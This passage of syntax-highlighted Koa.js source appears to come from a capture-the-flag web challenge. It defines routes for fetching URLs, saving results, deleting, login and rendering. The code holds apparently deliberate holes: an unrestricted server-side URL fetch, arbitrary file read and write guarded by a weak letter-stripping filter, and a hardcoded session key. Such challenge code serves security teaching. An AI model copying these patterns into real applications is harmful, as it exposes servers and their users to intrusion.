</span></span><span style=display:flex><span>        <span style=color:#75af00>ctx</span><span style=color:#111>.</span><span style=color:#75af00>response</span><span style=color:#111>.</span><span style=color:#75af00>body</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;missing parameter:param&#39;</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span>
</span></span><span style=display:flex><span><span style=color:#111>})</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75af00>home</span><span style=color:#111>.</span><span style=color:#75af00>get</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/request&#39;</span><span style=color:#111>,</span><span style=color:#00a8c8>async</span><span style=color:#111>(</span><span style=color:#75af00>ctx</span><span style=color:#111>)=&gt;{</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>if</span><span style=color:#111>(</span><span style=color:#75af00>ctx</span><span style=color:#111>.</span><span style=color:#75af00>session</span><span style=color:#111>.</span><span style=color:#75af00>username</span> <span style=color:#f92672>===</span> <span style=color:#d88200>&#39;ADMIN&#39;</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#75af00>ctx</span><span style=color:#111>.</span><span style=color:#75af00>query</span><span style=color:#111>.</span><span style=color:#75af00>url</span><span style=color:#111>){</span>
</span></span><span style=display:flex><span>        <span style=color:#75af00>url</span> <span style=color:#f92672>=</span> <span style=color:#111>decodeURI</span><span style=color:#111>(</span><span style=color:#75af00>checkUrl</span><span style=color:#111>(</span><span style=color:#75af00>ctx</span><span style=color:#111>.</span><span style=color:#75af00>query</span><span style=color:#111>.</span><span style=color:#75af00>url</span><span style=color:#111>))</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>if</span><span style=color:#111>(</span><span style=color:#75af00>url</span> <span style=color:#f92672>===</span> <span style=color:#d88200>&#39;errorurl&#39;</span><span style=color:#111>){</span>
</span></span><span style=display:flex><span>            <span style=color:#75af00>ctx</span><span style=color:#111>.</span><span style=color:#75af00>response</span><span style=color:#111>.</span><span style=color:#75af00>body</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;error url&#39;</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span>        <span style=color:#111>}</span><span style=color:#00a8c8>else</span><span style=color:#111>{</span>
</span></span><span style=display:flex><span>            <span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#d88200>&#34;请求的url:&#34;</span><span style=color:#f92672>+</span><span style=color:#00a8c8>typeof</span><span style=color:#111>(</span><span style=color:#75af00>url</span><span style=color:#111>)</span><span style=color:#f92672>+</span><span style=color:#d88200>&#34;:&#34;</span><span style=color:#f92672>+</span><span style=color:#75af00>url</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>return</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Promise</span><span style=color:#111>(</span> <span style=color:#75af00>resolve</span> <span style=color:#111>=&gt;</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>                <span style=color:#00a8c8>const</span> <span style=color:#75af00>req</span> <span style=color:#f92672>=</span> <span style=color:#75af00>http</span><span style=color:#111>.</span><span style=color:#75af00>request</span><span style=color:#111>(</span><span style=color:#75af00>url</span><span style=color:#111>,</span> <span style=color:#75af00>res</span> <span style=color:#111>=&gt;</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>                    <span style=color:#75af00>res</span><span style=color:#111>.</span><span style=color:#75af00>setEncoding</span><span style=color:#111>(</span><span style=color:#d88200>&#39;utf-8&#39;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>                    <span style=color:#00a8c8>let</span> <span style=color:#75af00>data</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;&#39;</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span>                    <span style=color:#00a8c8>let</span> <span style=color:#75af00>error</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                    <span style=color:#00a8c8>if</span> <span style=color:#111>(</span><span style=color:#75af00>res</span><span style=color:#111>.</span><span style=color:#75af00>statusCode</span> <span style=color:#f92672>!==</span> <span style=color:#ae81ff>200</span><span style=color:#111>){</span>
</span></span><span style=display:flex><span>                        <span style=color:#75af00>error</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Error</span><span style=color:#111>(</span><span style=color:#d88200>&#39;请求失败\n&#39;</span> <span style=color:#f92672>+</span>
</span></span><span style=display:flex><span>                        <span style=color:#d88200>`状态码: </span><span style=color:#d88200>${</span><span style=color:#75af00>res</span><span style=color:#111>.</span><span style=color:#75af00>statusCode</span><span style=color:#d88200>}</span><span style=color:#d88200>`</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>                    <span style=color:#111>};</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                    <span style=color:#00a8c8>if</span> <span style=color:#111>(</span><span style=color:#75af00>error</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>                        <span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>error</span><span style=color:#111>(</span><span style=color:#75af00>error</span><span style=color:#111>.</span><span style=color:#75af00>message</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>                        <span style=color:#75af00>res</span><span style=color:#111>.</span><span style=color:#75af00>resume</span><span style=color:#111>();</span>
</span></span><span style=display:flex><span>                        <span style=color:#00a8c8>return</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span>                    <span style=color:#111>}</span>
</span></span><span style=display:flex><span>                    <span style=color:#75af00>res</span><span style=color:#111>.</span><span style=color:#75af00>on</span><span style=color:#111>(</span><span style=color:#d88200>&#39;data&#39;</span><span style=color:#111>,</span> <span style=color:#75af00>chunk</span> <span style=color:#111>=&gt;</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>                        <span style=color:#75af00>data</span> <span style=color:#f92672>+=</span> <span style=color:#75af00>chunk</span><span style=color:#111>.</span><span style=color:#75af00>toString</span><span style=color:#111>();</span>
</span></span><span style=display:flex><span>                    <span style=color:#111>});</span>
</span></span><span style=display:flex><span>                    <span style=color:#75af00>res</span><span style=color:#111>.</span><span style=color:#75af00>on</span><span style=color:#111>(</span><span style=color:#d88200>&#39;end&#39;</span><span style=color:#111>,</span> <span style=color:#00a8c8>async</span><span style=color:#111>()</span> <span style=color:#111>=&gt;</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>                        <span style=color:#00a8c8>let</span> <span style=color:#75af00>out</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>await</span> <span style=color:#75af00>WriteResults</span><span style=color:#111>(</span><span style=color:#75af00>ctx</span><span style=color:#111>.</span><span style=color:#75af00>session</span><span style=color:#111>.</span><span style=color:#75af00>sandbox</span><span style=color:#111>,</span><span style=color:#75af00>data</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>                        <span style=color:#75af00>ctx</span><span style=color:#111>.</span><span style=color:#75af00>body</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;Requst results in :&#39;</span><span style=color:#f92672>+</span><span style=color:#75af00>out</span><span style=color:#111>.</span><span style=color:#75af00>replace</span><span style=color:#111>(</span><span style=color:#d88200>&#39;tmp&#39;</span><span style=color:#111>,</span><span style=color:#d88200>&#39;&#39;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>                        <span style=color:#75af00>resolve</span><span style=color:#111>();</span>
</span></span><span style=display:flex><span>                    <span style=color:#111>})</span>
</span></span><span style=display:flex><span>                <span style=color:#111>})</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                <span style=color:#75af00>req</span><span style=color:#111>.</span><span style=color:#75af00>on</span><span style=color:#111>(</span><span style=color:#d88200>&#39;error&#39;</span><span style=color:#111>,</span> <span style=color:#00a8c8>function</span><span style=color:#111>(</span><span style=color:#75af00>err</span><span style=color:#111>){</span>
</span></span><span style=display:flex><span>                    <span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#75af00>err</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>                  <span style=color:#111>});</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                <span style=color:#75af00>req</span><span style=color:#111>.</span><span style=color:#75af00>end</span><span style=color:#111>();</span>
</span></span><span style=display:flex><span>            <span style=color:#111>});</span>
</span></span><span style=display:flex><span>        <span style=color:#111>}</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span><span style=color:#00a8c8>else</span><span style=color:#111>{</span>
</span></span><span style=display:flex><span>        <span style=color:#75af00>ctx</span><span style=color:#111>.</span><span style=color:#75af00>status</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>403</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span>        <span style=color:#75af00>ctx</span><span style=color:#111>.</span><span style=color:#75af00>response</span><span style=color:#111>.</span><span style=color:#75af00>body</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;403: You have not the permission&#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span>
</span></span><span style=display:flex><span><span style=color:#111>})</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75af00>home</span><span style=color:#111>.</span><span style=color:#75af00>get</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/save&#39;</span><span style=color:#111>,</span><span style=color:#00a8c8>async</span><span style=color:#111>(</span><span style=color:#75af00>ctx</span><span style=color:#111>)=&gt;{</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>let</span> <span style=color:#75af00>ip</span> <span style=color:#f92672>=</span> <span style=color:#75af00>ctx</span><span style=color:#111>.</span><span style=color:#75af00>request</span><span style=color:#111>.</span><span style=color:#75af00>ip</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>if</span> <span style=color:#111>(</span><span style=color:#75af00>ip</span><span style=color:#111>.</span><span style=color:#75af00>substr</span><span style=color:#111>(</span><span style=color:#ae81ff>0</span><span style=color:#111>,</span> <span style=color:#ae81ff>7</span><span style=color:#111>)</span> <span style=color:#f92672>==</span> <span style=color:#d88200>&#34;::ffff:&#34;</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>        <span style=color:#75af00>ip</span> <span style=color:#f92672>=</span> <span style=color:#75af00>ip</span><span style=color:#111>.</span><span style=color:#75af00>substr</span><span style=color:#111>(</span><span style=color:#ae81ff>7</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>if</span> <span style=color:#111>(</span><span style=color:#75af00>ip</span> <span style=color:#f92672>!==</span> <span style=color:#d88200>&#39;127.0.0.1&#39;</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#75af00>ip</span> <span style=color:#f92672>!==</span> <span style=color:#75af00>server_ip</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>        <span style=color:#75af00>ctx</span><span style=color:#111>.</span><span style=color:#75af00>status</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>403</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span>        <span style=color:#75af00>ctx</span><span style=color:#111>.</span><span style=color:#75af00>response</span><span style=color:#111>.</span><span style=color:#75af00>body</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;403: You are not the local user&#39;</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span><span style=color:#00a8c8>else</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>let</span> <span style=color:#75af00>reqbody</span> <span style=color:#f92672>=</span> <span style=color:#111>{</span><span style=color:#00a8c8>switch</span><span style=color:#f92672>:</span><span style=color:#00a8c8>false</span><span style=color:#111>}</span>
</span></span><span style=display:flex><span>        <span style=color:#75af00>reqbody</span> <span style=color:#f92672>=</span> <span style=color:#75af00>qs</span><span style=color:#111>.</span><span style=color:#75af00>parse</span><span style=color:#111>(</span><span style=color:#75af00>ctx</span><span style=color:#111>.</span><span style=color:#75af00>querystring</span><span style=color:#111>,{</span><span style=color:#75af00>allowPrototypes</span><span style=color:#f92672>:</span> <span style=color:#00a8c8>false</span><span style=color:#111>});</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>if</span><span style=color:#111>(</span><span style=color:#75af00>reqbody</span><span style=color:#111>.</span><span style=color:#00a8c8>switch</span> <span style=color:#f92672>===</span> <span style=color:#00a8c8>true</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#75af00>reqbody</span><span style=color:#111>.</span><span style=color:#75af00>sandbox</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#75af00>reqbody</span><span style=color:#111>.</span><span style=color:#75af00>opath</span> <span style=color:#f92672>&amp;&amp;</span><span style=color:#75af00>fs</span><span style=color:#111>.</span><span style=color:#75af00>existsSync</span><span style=color:#111>(</span><span style=color:#75af00>reqbody</span><span style=color:#111>.</span><span style=color:#75af00>spath</span><span style=color:#111>)){</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>if</span><span style=color:#111>(</span><span style=color:#75af00>fs</span><span style=color:#111>.</span><span style=color:#75af00>existsSync</span><span style=color:#111>(</span><span style=color:#75af00>reqbody</span><span style=color:#111>.</span><span style=color:#75af00>sandbox</span><span style=color:#111>)){</span>
</span></span><span style=display:flex><span>                <span style=color:#75af00>paths</span><span style=color:#111>.</span><span style=color:#75af00>opath</span> <span style=color:#f92672>=</span> <span style=color:#75af00>fs</span><span style=color:#111>.</span><span style=color:#75af00>readdirSync</span><span style=color:#111>(</span><span style=color:#75af00>reqbody</span><span style=color:#111>.</span><span style=color:#75af00>sandbox</span><span style=color:#111>)[</span><span style=color:#ae81ff>0</span><span style=color:#111>];</span>
</span></span><span style=display:flex><span>            <span style=color:#111>}</span><span style=color:#00a8c8>else</span> <span style=color:#00a8c8>if</span><span style=color:#111>(</span><span style=color:#75af00>fs</span><span style=color:#111>.</span><span style=color:#75af00>existsSync</span><span style=color:#111>(</span><span style=color:#75af00>reqbody</span><span style=color:#111>.</span><span style=color:#75af00>opath</span><span style=color:#111>)){</span>
</span></span><span style=display:flex><span>                <span style=color:#00a8c8>let</span> <span style=color:#75af00>buffer</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span>                <span style=color:#75af00>tmp</span><span style=color:#111>[</span><span style=color:#75af00>reqbody</span><span style=color:#111>.</span><span style=color:#75af00>sandbox</span><span style=color:#111>][</span><span style=color:#d88200>&#39;opath&#39;</span><span style=color:#111>]</span> <span style=color:#f92672>=</span> <span style=color:#75af00>reqbody</span><span style=color:#111>.</span><span style=color:#75af00>opath</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span>                <span style=color:#00a8c8>if</span><span style=color:#111>(</span><span style=color:#d88200>/[flag]/</span><span style=color:#111>.</span><span style=color:#75af00>test</span><span style=color:#111>(</span><span style=color:#75af00>tmp</span><span style=color:#111>[</span><span style=color:#75af00>reqbody</span><span style=color:#111>.</span><span style=color:#75af00>sandbox</span><span style=color:#111>][</span><span style=color:#d88200>&#39;opath&#39;</span><span style=color:#111>])){</span>
</span></span><span style=display:flex><span>                    <span style=color:#75af00>buffer</span> <span style=color:#f92672>=</span> <span style=color:#75af00>tmp</span><span style=color:#111>[</span><span style=color:#75af00>reqbody</span><span style=color:#111>.</span><span style=color:#75af00>sandbox</span><span style=color:#111>][</span><span style=color:#d88200>&#39;opath&#39;</span><span style=color:#111>].</span><span style=color:#75af00>replace</span><span style=color:#111>(</span><span style=color:#d88200>/f|l|a|g/g</span><span style=color:#111>,</span><span style=color:#d88200>&#39;&#39;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>                <span style=color:#111>}</span><span style=color:#00a8c8>else</span><span style=color:#111>{</span>
</span></span><span style=display:flex><span>                    <span style=color:#75af00>buffer</span> <span style=color:#f92672>=</span> <span style=color:#75af00>reqbody</span><span style=color:#111>.</span><span style=color:#75af00>opath</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span>                <span style=color:#111>}</span>
</span></span><span style=display:flex><span>            <span style=color:#111>}</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>let</span> <span style=color:#75af00>opath</span> <span style=color:#f92672>=</span> <span style=color:#75af00>paths</span><span style=color:#111>.</span><span style=color:#75af00>opath</span><span style=color:#f92672>?</span> <span style=color:#75af00>paths</span><span style=color:#111>.</span><span style=color:#75af00>opath</span> <span style=color:#f92672>:</span> <span style=color:#75af00>buffer</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>let</span> <span style=color:#75af00>text</span> <span style=color:#f92672>=</span> <span style=color:#75af00>fs</span><span style=color:#111>.</span><span style=color:#75af00>readFileSync</span><span style=color:#111>(</span><span style=color:#75af00>opath</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;utf8&#39;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>await</span> <span style=color:#75af00>WriteResults</span><span style=color:#111>(</span><span style=color:#75af00>reqbody</span><span style=color:#111>.</span><span style=color:#75af00>spath</span><span style=color:#111>,</span><span style=color:#75af00>text</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#111>}</span><span style=color:#00a8c8>else</span><span style=color:#111>{</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>return</span> <span style=color:#00a8c8>false</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span>        <span style=color:#111>}</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span>
</span></span><span style=display:flex><span><span style=color:#111>})</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75af00>home</span><span style=color:#111>.</span><span style=color:#75af00>get</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/delete&#39;</span><span style=color:#111>,</span><span style=color:#00a8c8>async</span><span style=color:#111>(</span><span style=color:#75af00>ctx</span><span style=color:#111>)=&gt;{</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>if</span><span style=color:#111>(</span><span style=color:#75af00>ctx</span><span style=color:#111>.</span><span style=color:#75af00>session</span><span style=color:#111>.</span><span style=color:#75af00>username</span> <span style=color:#f92672>===</span> <span style=color:#d88200>&#39;ADMIN&#39;</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#75af00>fs</span><span style=color:#111>.</span><span style=color:#75af00>existsSync</span><span style=color:#111>(</span><span style=color:#75af00>ctx</span><span style=color:#111>.</span><span style=color:#75af00>session</span><span style=color:#111>.</span><span style=color:#75af00>sandbox</span><span style=color:#f92672>+</span><span style=color:#d88200>&#39;/results.txt&#39;</span><span style=color:#111>)){</span>
</span></span><span style=display:flex><span>        <span style=color:#75af00>DeleteResults</span><span style=color:#111>(</span><span style=color:#75af00>ctx</span><span style=color:#111>.</span><span style=color:#75af00>session</span><span style=color:#111>.</span><span style=color:#75af00>sandbox</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>        <span style=color:#75af00>ctx</span><span style=color:#111>.</span><span style=color:#75af00>response</span><span style=color:#111>.</span><span style=color:#75af00>body</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;Delete the results Successfully!&#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span><span style=color:#00a8c8>else</span><span style=color:#111>{</span>
</span></span><span style=display:flex><span>        <span style=color:#75af00>ctx</span><span style=color:#111>.</span><span style=color:#75af00>response</span><span style=color:#111>.</span><span style=color:#75af00>body</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;Nothing to delete!&#39;</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span>
</span></span><span style=display:flex><span><span style=color:#111>})</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75af00>home</span><span style=color:#111>.</span><span style=color:#75af00>get</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/login&#39;</span><span style=color:#111>,</span><span style=color:#00a8c8>async</span><span style=color:#111>(</span><span style=color:#75af00>ctx</span><span style=color:#111>)=&gt;{</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>if</span><span style=color:#111>(</span><span style=color:#75af00>ctx</span><span style=color:#111>.</span><span style=color:#75af00>query</span><span style=color:#111>.</span><span style=color:#75af00>userName</span><span style=color:#111>){</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>let</span> <span style=color:#75af00>username</span> <span style=color:#f92672>=</span> <span style=color:#75af00>checkUser</span><span style=color:#111>(</span><span style=color:#75af00>ctx</span><span style=color:#111>.</span><span style=color:#75af00>query</span><span style=color:#111>.</span><span style=color:#75af00>userName</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>if</span> <span style=color:#111>(</span><span style=color:#75af00>username</span> <span style=color:#f92672>!==</span> <span style=color:#00a8c8>undefined</span><span style=color:#111>){</span>
</span></span><span style=display:flex><span>            <span style=color:#75af00>ctx</span><span style=color:#111>.</span><span style=color:#75af00>session</span><span style=color:#111>.</span><span style=color:#75af00>username</span> <span style=color:#f92672>=</span> <span style=color:#75af00>username</span><span style=color:#111>.</span><span style=color:#75af00>toUpperCase</span><span style=color:#111>();</span>
</span></span><span style=display:flex><span>        <span style=color:#111>}</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>ctx</span><span style=color:#111>.</span><span style=color:#75af00>redirect</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/&#39;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span><span style=color:#111>})</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75af00>home</span><span style=color:#111>.</span><span style=color:#75af00>get</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/&#39;</span><span style=color:#111>,</span><span style=color:#00a8c8>async</span><span style=color:#111>(</span><span style=color:#75af00>ctx</span><span style=color:#111>)=&gt;{</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>let</span> <span style=color:#75af00>isAdmin</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>undefined</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>if</span><span style=color:#111>(</span><span style=color:#f92672>!</span><span style=color:#75af00>ctx</span><span style=color:#111>.</span><span style=color:#75af00>session</span><span style=color:#111>.</span><span style=color:#75af00>username</span><span style=color:#111>){</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>await</span> <span style=color:#75af00>ctx</span><span style=color:#111>.</span><span style=color:#75af00>render</span><span style=color:#111>(</span><span style=color:#d88200>&#39;user&#39;</span><span style=color:#111>,{</span>
</span></span><span style=display:flex><span>            <span style=color:#75af00>list</span><span style=color:#f92672>:</span><span style=color:#00a8c8>undefined</span><span style=color:#111>,</span>
</span></span><span style=display:flex><span>            <span style=color:#75af00>isAdmin</span><span style=color:#f92672>:</span><span style=color:#75af00>isAdmin</span>
</span></span><span style=display:flex><span>        <span style=color:#111>});</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span><span style=color:#00a8c8>else</span><span style=color:#111>{</span>
</span></span><span style=display:flex><span>        <span style=color:#75af00>info</span><span style=color:#111>.</span><span style=color:#75af00>username</span> <span style=color:#f92672>=</span> <span style=color:#75af00>ctx</span><span style=color:#111>.</span><span style=color:#75af00>session</span><span style=color:#111>.</span><span style=color:#75af00>username</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span>        <span style=color:#75af00>info</span><span style=color:#111>.</span><span style=color:#75af00>Privilege</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;Staff&#34;</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>if</span><span style=color:#111>(</span><span style=color:#75af00>ctx</span><span style=color:#111>.</span><span style=color:#75af00>session</span><span style=color:#111>.</span><span style=color:#75af00>username</span> <span style=color:#f92672>===</span> <span style=color:#d88200>&#39;ADMIN&#39;</span><span style=color:#111>){</span>
</span></span><span style=display:flex><span>            <span style=color:#75af00>info</span><span style=color:#111>.</span><span style=color:#75af00>Privilege</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;Monitor&#34;</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span>            <span style=color:#75af00>isAdmin</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>true</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>if</span><span style=color:#111>(</span><span style=color:#f92672>!</span><span style=color:#75af00>ctx</span><span style=color:#111>.</span><span style=color:#75af00>session</span><span style=color:#111>.</span><span style=color:#75af00>sandbox</span><span style=color:#111>){</span>
</span></span><span style=display:flex><span>                <span style=color:#75af00>ctx</span><span style=color:#111>.</span><span style=color:#75af00>session</span><span style=color:#111>.</span><span style=color:#75af00>sandbox</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;tmp/&#39;</span><span style=color:#f92672>+</span><span style=color:#75af00>md5</span><span style=color:#111>(</span><span style=color:#75af00>ctx</span><span style=color:#111>.</span><span style=color:#75af00>request</span><span style=color:#111>.</span><span style=color:#75af00>ip</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>            <span style=color:#111>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>if</span> <span style=color:#111>(</span><span style=color:#f92672>!</span><span style=color:#75af00>fs</span><span style=color:#111>.</span><span style=color:#75af00>existsSync</span><span style=color:#111>(</span><span style=color:#75af00>ctx</span><span style=color:#111>.</span><span style=color:#75af00>session</span><span style=color:#111>.</span><span style=color:#75af00>sandbox</span><span style=color:#111>)){</span>
</span></span><span style=display:flex><span>                <span style=color:#75af00>fs</span><span style=color:#111>.</span><span style=color:#75af00>mkdirSync</span><span style=color:#111>(</span><span style=color:#75af00>ctx</span><span style=color:#111>.</span><span style=color:#75af00>session</span><span style=color:#111>.</span><span style=color:#75af00>sandbox</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>            <span style=color:#111>}</span>
</span></span><span style=display:flex><span>        <span style=color:#111>}</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>await</span> <span style=color:#75af00>ctx</span><span style=color:#111>.</span><span style=color:#75af00>render</span><span style=color:#111>(</span><span style=color:#d88200>&#39;user&#39;</span><span style=color:#111>,{</span>
</span></span><span style=display:flex><span>            <span style=color:#75af00>list</span><span style=color:#f92672>:</span><span style=color:#75af00>info</span><span style=color:#111>,</span>
</span></span><span style=display:flex><span>            <span style=color:#75af00>isAdmin</span><span style=color:#f92672>:</span><span style=color:#75af00>isAdmin</span>
</span></span><span style=display:flex><span>        <span style=color:#111>});</span>
</span></span><span style=display:flex><span>    <span style=color:#111>}</span>
</span></span><span style=display:flex><span><span style=color:#111>})</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75af00>app</span><span style=color:#111>.</span><span style=color:#75af00>keys</span> <span style=color:#f92672>=</span> <span style=color:#111>[</span><span style=color:#d88200>&#39;hpdoger&#39;</span><span style=color:#111>];</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>var</span> <span style=color:#75af00>info</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Object</span><span style=color:#111>();</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>var</span> <span style=color:#75af00>tmp</span> <span style=color:#f92672>=</span> <span style=color:#111>[];</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>var</span> <span style=color:#75af00>paths</span> <span style=color:#f92672>=</span> <span style=color:#111>[];</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>//depend on remote server,not real
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#00a8c8>var</span> <span style=color:#75af00>server_ip</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;127.0.0.1&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75af00>app</span><span style=color:#111>.</span><span style=color:#75af00>use</span><span style=color:#111>(</span><span style=color:#75af00>views</span><span style=color:#111>(</span><span style=color:#75af00>path</span><span style=color:#111>.</span><span style=color:#75af00>join</span><span style=color:#111>(</span><span style=color:#75af00>__dirname</span><span style=color:#111>,</span> <span style=color:#d88200>&#39;./views&#39;</span><span style=color:#111>),</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>extension</span><span style=color:#f92672>:</span> <span style=color:#d88200>&#39;ejs&#39;</span>
</span></span><span style=display:flex><span><span style=color:#111>}))</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75af00>app</span><span style=color:#111>.</span><span style=color:#75af00>use</span><span style=color:#111>(</span><span style=color:#00a8c8>static</span><span style=color:#111>(</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>path</span><span style=color:#111>.</span><span style=color:#75af00>join</span><span style=color:#111>(</span> <span style=color:#75af00>__dirname</span><span style=color:#111>,</span>  <span style=color:#d88200>&#39;./static&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>  <span style=color:#111>))</span>
</span></span><span style=display:flex><span><span style=color:#75af00>app</span><span style=color:#111>.</span><span style=color:#75af00>use</span><span style=color:#111>(</span><span style=color:#00a8c8>static</span><span style=color:#111>(</span>
